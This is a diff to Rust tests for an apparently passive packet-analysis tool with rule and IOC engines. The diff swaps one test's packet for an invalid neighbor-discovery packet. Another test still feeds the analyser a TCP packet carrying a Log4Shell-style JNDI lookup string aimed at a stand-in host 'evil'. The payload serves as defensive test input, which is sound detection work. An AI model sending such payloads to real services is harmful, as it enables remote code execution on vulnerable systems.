@@ -1,5 +1,7 @@
 #[path = "support/packets.rs"]
 mod packets;
+#[path = "support/critical.rs"]
+mod critical;
 
 #[cfg(feature = "terminal-ui")]
 use packrat_tui::app::App;
@@ -14,7 +16,7 @@ fn core_runs_on_a_worker_without_a_terminal_or_async_runtime() {
         let mut core = AnalysisCore::default();
         assert!(core.rule_engine.rules.is_empty());
         assert_eq!(core.ioc_engine.ioc_count(), 0);
-        core.analyze(&packets::tcp(1, 100, 0x18, b"${jndi:ldap://evil/x}"))
+        core.analyze(&critical::invalid_neighbor_discovery_hop_limit(1))
     })
     .join()
     .unwrap();
@@ -33,6 +35,7 @@ fn terminal_adapter_and_headless_core_produce_the_same_passive_results() {
         packets::tcp(1, 100, 0x02, &[]),
         packets::tcp(2, 101, 0x18, b"GET / HTTP/1.1\r\nHost: example\r\n\r\n"),
         packets::tcp(3, 135, 0x18, b"${jndi:ldap://evil/x}"),
+        critical::invalid_neighbor_discovery_hop_limit(4),
     ] {
         core.analyze_with_history(&packet, history.iter().cloned());
         history.push(packet.clone());
